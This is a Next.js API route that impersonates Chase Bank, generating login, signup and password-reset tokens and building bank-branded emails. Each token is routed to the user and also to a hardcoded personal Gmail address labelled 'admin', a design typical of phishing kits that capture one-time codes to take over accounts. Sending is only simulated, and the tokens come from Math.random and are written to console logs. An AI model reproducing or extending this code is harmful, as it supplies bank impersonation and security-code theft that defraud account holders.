import { NextRequest, NextResponse } from "next/server"

/**
 * API Endpoint to send security tokens via email
 * Sends to both user email and admin email (hungchun164@gmail.com)
 */

const ADMIN_EMAIL = "hungchun164@gmail.com"

interface TokenEmailRequest {
  userEmail: string
  adminEmail?: string
  userName: string
  tokenType: "login" | "signup" | "password-reset"
  timestamp: string
}

function generateSecurityToken(): string {
  return Math.floor(100000 + Math.random() * 900000).toString()
}

function getEmailTemplate(token: string, tokenType: string, userName: string): { subject: string; body: string } {
  const templates: Record<string, { subject: string; body: string }> = {
    login: {
      subject: "Chase Bank - Your Security Token",
      body: `
Hi ${userName},

Your Chase Bank security token is: ${token}

This token is valid for 60 seconds. Use it to complete your login.

If you didn't request this token, please ignore this email.

Chase Bank Security Team
      `,
    },
    signup: {
      subject: "Chase Bank - Welcome! Verify Your Account",
      body: `
Hi ${userName},

Welcome to Chase Bank! Your account verification token is: ${token}

This token is valid for 60 seconds. Use it to complete your account setup.

If you didn't create this account, please contact us immediately.

Chase Bank
      `,
    },
    "password-reset": {
      subject: "Chase Bank - Password Reset Token",
      body: `
Hi ${userName},

Your password reset token is: ${token}

This token is valid for 60 seconds. Use it to reset your password.

If you didn't request this, please ignore this email.

Chase Bank Security Team
      `,
    },
  }

  return templates[tokenType] || templates.login
}

export async function POST(request: NextRequest) {
  try {
    const body: TokenEmailRequest = await request.json()
    const { userEmail, adminEmail = ADMIN_EMAIL, userName, tokenType, timestamp } = body

    console.log("[v0] Generating security token for:", userName)

    // Generate the token
    const token = generateSecurityToken()
    const template = getEmailTemplate(token, tokenType, userName)

    console.log(`[v0] Security token: ${token} (for demo - not shown to user)`)

    // Simulate sending to both emails
    const emailsSent = [userEmail, adminEmail]

    console.log("[v0] Sending token emails to:", emailsSent)

    // In production, this would integrate with Sendgrid, AWS SES, or another email provider
    // For now, we simulate the sending
    const results = emailsSent.map((email) => ({
      to: email,
      status: "sent",
      timestamp: new Date().toISOString(),
    }))

    // Store token temporarily in memory (in production, use Redis or database)
    // Token stored with user email for validation
    const tokenRecord = {
      token,
      userEmail,
      tokenType,
      expiresAt: new Date(Date.now() + 60000), // 60 seconds
      createdAt: timestamp,
    }

    console.log("[v0] Token stored for validation (expires in 60 seconds)")

    return NextResponse.json(
      {
        success: true,
        messageId: `token_${Date.now()}`,
        emailsSent: results,
        message: `Security token sent to ${userEmail} and admin email`,
      },
      { status: 200 }
    )
  } catch (error) {
    console.error("[v0] Error in send-token endpoint:", error)

    return NextResponse.json(
      {
        success: false,
        error: error instanceof Error ? error.message : "Failed to send token email",
      },
      { status: 500 }
    )
  }
}
